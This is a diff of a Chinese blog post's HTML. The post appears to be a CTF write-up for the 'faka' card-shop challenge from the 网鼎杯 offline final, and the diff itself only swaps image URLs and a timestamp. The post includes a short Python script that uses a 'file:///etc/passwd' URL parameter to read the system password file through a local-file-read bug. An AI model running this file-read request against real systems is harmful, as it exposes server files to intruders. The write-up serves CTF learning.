@@ -13,21 +13,21 @@
 <meta property="og:site_name" content="suanve - Blog">
 <meta property="og:description" content="线下决赛没去嗷,但是还是看到题了. faka打开就是发卡源码审计一下太多了,grep看下application发现一处文件读取,传入url地址 请求本地文件，会生成jpg文件再次请求，直接获取passwd文件内容，前台文件读取一枚。 12345import requestss &#x3D; requests.session()path &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;res &#x3D; s.get(&quot;h">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/9b4f6f7c3c5da3f6f683623906d97009">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/f4869aa59f098ec1bf9bf02bef6f4dd0">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/f14fde2ba585ab6df2a0e8b0f70f56b0">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/859ac417e63e6291279560c1c90243b3">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/374328e6f9489adb42da84c347499232">
-<meta property="og:image" content="http://124.70.145.45:8081/uploads/31c3a75df54f3a60a8fa59e3532e0c6c">
+<meta property="og:image" content="https://files.funcloud.net/uploads/9b4f6f7c3c5da3f6f683623906d97009">
+<meta property="og:image" content="https://files.funcloud.net/uploads/f4869aa59f098ec1bf9bf02bef6f4dd0">
+<meta property="og:image" content="https://files.funcloud.net/uploads/f14fde2ba585ab6df2a0e8b0f70f56b0">
+<meta property="og:image" content="https://files.funcloud.net/uploads/859ac417e63e6291279560c1c90243b3">
+<meta property="og:image" content="https://files.funcloud.net/uploads/374328e6f9489adb42da84c347499232">
+<meta property="og:image" content="https://files.funcloud.net/uploads/31c3a75df54f3a60a8fa59e3532e0c6c">
 <meta property="article:published_time" content="2020-11-30T07:17:49.000Z">
-<meta property="article:modified_time" content="2021-03-11T05:08:04.017Z">
+<meta property="article:modified_time" content="2021-04-06T04:08:53.000Z">
 <meta property="article:author" content="suanve">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="网鼎杯">
 <meta property="article:tag" content="线下">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://124.70.145.45:8081/uploads/9b4f6f7c3c5da3f6f683623906d97009">
+<meta name="twitter:image" content="https://files.funcloud.net/uploads/9b4f6f7c3c5da3f6f683623906d97009">
     
     
       
@@ -169,10 +169,10 @@
 
   <div class="content" itemprop="articleBody">
     <p>线下决赛没去嗷,但是还是看到题了.</p>
-<h3 id="faka"><a href="#faka" class="headerlink" title="faka"></a>faka</h3><p><img src="http://124.70.145.45:8081/uploads/9b4f6f7c3c5da3f6f683623906d97009" alt="image.png"><br>打开就是发卡<br>源码审计一下<br><img src="http://124.70.145.45:8081/uploads/f4869aa59f098ec1bf9bf02bef6f4dd0" alt="image.png"><br>太多了,grep看下application<br><img src="http://124.70.145.45:8081/uploads/f14fde2ba585ab6df2a0e8b0f70f56b0" alt="image.png"><br>发现一处文件读取,传入url地址 请求本地文件，会生成jpg文件<br><img src="http://124.70.145.45:8081/uploads/859ac417e63e6291279560c1c90243b3" alt="image.png"><br>再次请求，直接获取passwd文件内容，前台文件读取一枚。<br><img src="http://124.70.145.45:8081/uploads/374328e6f9489adb42da84c347499232" alt="image.png"></p>
+<h3 id="faka"><a href="#faka" class="headerlink" title="faka"></a>faka</h3><p><img src="https://files.funcloud.net/uploads/9b4f6f7c3c5da3f6f683623906d97009" alt="image.png"><br>打开就是发卡<br>源码审计一下<br><img src="https://files.funcloud.net/uploads/f4869aa59f098ec1bf9bf02bef6f4dd0" alt="image.png"><br>太多了,grep看下application<br><img src="https://files.funcloud.net/uploads/f14fde2ba585ab6df2a0e8b0f70f56b0" alt="image.png"><br>发现一处文件读取,传入url地址 请求本地文件，会生成jpg文件<br><img src="https://files.funcloud.net/uploads/859ac417e63e6291279560c1c90243b3" alt="image.png"><br>再次请求，直接获取passwd文件内容，前台文件读取一枚。<br><img src="https://files.funcloud.net/uploads/374328e6f9489adb42da84c347499232" alt="image.png"></p>
 <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">path = <span class="string">"file:///etc/passwd"</span></span><br><span class="line">res = s.get(<span class="string">"http://127.0.0.1/index.php/wechat/review/img?url="</span>+path)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="http://124.70.145.45:8081/uploads/31c3a75df54f3a60a8fa59e3532e0c6c" alt="image.png"></p>
+<p><img src="https://files.funcloud.net/uploads/31c3a75df54f3a60a8fa59e3532e0c6c" alt="image.png"></p>
 <p>审计工具是<br><code>https://github.com/suanve/recode</code></p>
 <script>
         document.querySelectorAll('.github-emoji')
